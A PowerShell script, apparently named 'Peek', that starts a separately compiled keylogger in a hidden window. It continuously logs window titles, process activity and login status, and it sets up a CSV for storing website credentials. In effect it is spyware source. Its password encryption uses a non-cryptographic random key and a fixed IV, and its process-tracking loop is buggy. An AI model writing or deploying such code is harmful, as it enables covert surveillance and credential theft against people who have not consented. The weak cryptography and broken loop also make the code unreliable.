# Setup
$logDir = "$env:USERPROFILE\Documents\Peek\Logs"
$keyFile = "$logDir\encryption_key.key"
$credFile = "$logDir\creds.csv"
$keylogExe = "$PSScriptRoot\keylog\csharp\keylogger.exe"

# Ensure logging directory exists
New-Item -ItemType Directory -Force -Path $logDir | Out-Null

# Logging helper
function Log-Activity($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path "$logDir\activity_log.txt" -Value "$ts - $msg"
}

# Key generation and storage
function Generate-Key {
    $key = New-Object byte[] 32
    (New-Object Random).NextBytes($key)
    [System.IO.File]::WriteAllBytes($keyFile, $key)
    Log-Activity "New encryption key generated."
}

function Load-Key {
    if (-Not (Test-Path $keyFile)) {
        Generate-Key
    }
    return [System.IO.File]::ReadAllBytes($keyFile)
}

function Encrypt-Password($password, $key) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = @(0..15)
    $enc = $aes.CreateEncryptor()
    $ms = New-Object IO.MemoryStream
    $cs = New-Object Security.Cryptography.CryptoStream($ms, $enc, [Security.Cryptography.CryptoStreamMode]::Write)
    $sw = New-Object IO.StreamWriter($cs)
    $sw.Write($password)
    $sw.Close(); $cs.Close()
    return [Convert]::ToBase64String($ms.ToArray())
}

# Save to CSV instead of Excel
function Initialize-CredentialsCSV {
    if (-Not (Test-Path $credFile)) {
        "Website,Username,EncryptedPassword" | Out-File $credFile -Encoding UTF8
        Log-Activity "Credentials CSV initialized."
    }
}

function Save-ToCSV($site, $user, $encPwd) {
    try {
        "$site,$user,$encPwd" | Out-File -FilePath $credFile -Append -Encoding UTF8
        Log-Activity "Saved credentials for $site."
    } catch {
        Log-Activity "ERROR saving credentials: $_"
    }
}

# Launch keylogger (compiled separately)
if (Test-Path $keylogExe) {
    Start-Process -FilePath $keylogExe -WindowStyle Hidden
    Log-Activity "Keylogger started."
} else {
    Log-Activity "Keylogger executable not found at $keylogExe"
}

# Initialization
Initialize-CredentialsCSV
$key = Load-Key
Log-Activity "Service started under $env:USERNAME"

# Keep track of processes
$prev = @()

# Main loop
try {
    while ($true) {
        $win = (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Sort-Object StartTime -Descending | Select-Object -First 1)
        if ($win) {
            Log-Activity "Foreground: $($win.ProcessName) - $($win.MainWindowTitle)"
        }

        $curr = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 }
        foreach ($p in $curr) {
            if (-not ($prev -contains $p.Id)) {
                Log-Activity "New process: $($p.ProcessName)"
                $prev += $p.Id
            }
        }

        foreach ($pid in $prev) {
            if (-not ($curr.Id -contains $pid)) {
                $closed = Get-Process -Id $pid -ErrorAction SilentlyContinue
                if ($closed) {
                    Log-Activity "Process closed: $($closed.ProcessName)"
                }
                $prev = $prev | Where-Object { $_ -ne $pid }
            }
        }

        # Just log status — don't break the loop
        $logout = (Get-WmiObject -Class Win32_ComputerSystem).UserName
        if (-not $logout) {
            Log-Activity "No user currently logged in."
        }

        Start-Sleep -Seconds 5
    }
}
catch {
    $errMsg = "Fatal error: $($_.Exception.Message)`n$($_.ScriptStackTrace)"
    $errMsg | Out-File "$logDir\fatal_error.log" -Append
    Log-Activity $errMsg
    exit 1
}
